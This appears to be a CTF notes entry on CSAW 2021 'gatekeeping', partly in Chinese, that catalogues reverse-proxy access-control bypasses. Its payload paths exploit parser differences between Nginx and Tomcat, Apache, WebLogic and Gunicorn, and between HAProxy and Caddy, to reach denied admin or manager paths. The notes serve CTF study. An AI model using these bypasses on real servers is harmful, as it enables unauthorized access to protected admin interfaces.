---
title: "CSAW 2021 - gatekeeping"
description: "
Proxy 相關

Path parameters

Tomcat & Jetty: /path;param/abcd => /path/abcd
WebLogic & WildFly: /path;param/abcd => /path


Nginx + Tomcat

..;
情境: Nginx -> Tomcat, Nginx deny /manager

/docs/..;/manager/html

Nginx: /docs/..;/manager/html
Tomcat: /manager/html




情境: Nginx -> Tomcat, Nginx deny /console/ (location ~* /console/)

/..;/console;/flag

Nginx: /..;/console;/flag
Tomcat: /console/flag






Nginx + Apache

情境: Nginx -> Apache, Nginx deny /admin

proxy_pass http://apache (No trailing slash，以原始資料送到後端)
/admin//../flag

Nginx: /flag
Apache: /admin/flag






Nginx + WebLogic

情境: Nginx -> WebLogic, Nginx deny /console

proxy_pass http://weblogic;

Nginx: /
WebLogic: /console


/#/../console




Nginx + Gunicorn

繞黑名單規則

Nginx deny /admin
/admin/key\x09HTTP/1.1/../../../

Nginx: /
Gunicorn: /admin/key


Nginx 新版本已修復
Example:


corCTF 2023 - pdf pal






Nginx + Swift

Example: Line CTF 2024 - zipviewer-version-clown

Nginx 大小寫敏感，Swift 不敏感
繞 Rate limit




Haproxy + Caddy

Haproxy: keep-alive + CONNECT + 2xx status，會讓其處於 tunnel mode，不採用任何 rules
Cadday: 用 normalized path 來 matching，但送出的卻不是 normalized path
Example: SecurityFest CTF 2022 - tunnelvision


ref: https://github.com/GrrrDog/weird_proxies/tree/master

"
external_category: "Web Exploitation"
---[Visit Website](https://lebr0nli.github.io/blog/security/nginx-gunicorn-CSAW2021/#exploit)

